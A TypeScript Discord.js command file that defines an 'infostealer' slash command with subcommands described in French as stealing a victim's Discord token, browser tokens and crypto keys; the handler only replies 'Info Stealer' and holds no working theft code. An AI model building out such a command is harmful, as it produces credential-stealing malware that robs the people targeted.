import { ApplicationCommandOptionType, ChatInputCommandInteraction, PermissionsBitField } from "discord.js";
import Command from "../base/classes/Command";
import CustomClient from "../base/classes/CustomClient";
import Category from "../base/enums/Category";


export default class Infostealer extends Command {
    constructor(client: CustomClient) {
        super(client, {
            name: "infostealer",
            description: "Vole les informations de la victime.",
            category: Category.Utilities,
            dm_permissions: false,
            default_member_permissions: PermissionsBitField.Flags.UseApplicationCommands,
            cooldown: 3,
            options: [
                {
                    name: "discord",
                    "description": "Vole le token discord.",
                    type: ApplicationCommandOptionType.Subcommand
                },
                {
                    name: "web-browser",
                    "description": "Vole les tokens de navigateur.",
                    type: ApplicationCommandOptionType.Subcommand
                },
                {
                    name: "crypto",
                    "description": "Vole les clées cryptos.",
                    type: ApplicationCommandOptionType.Subcommand
                },
            ]
        });
    }

    async Execute(interaction: ChatInputCommandInteraction) {
        await interaction.reply({
            content: "```diff\n-Info Stealer\n```"
        });
    }
}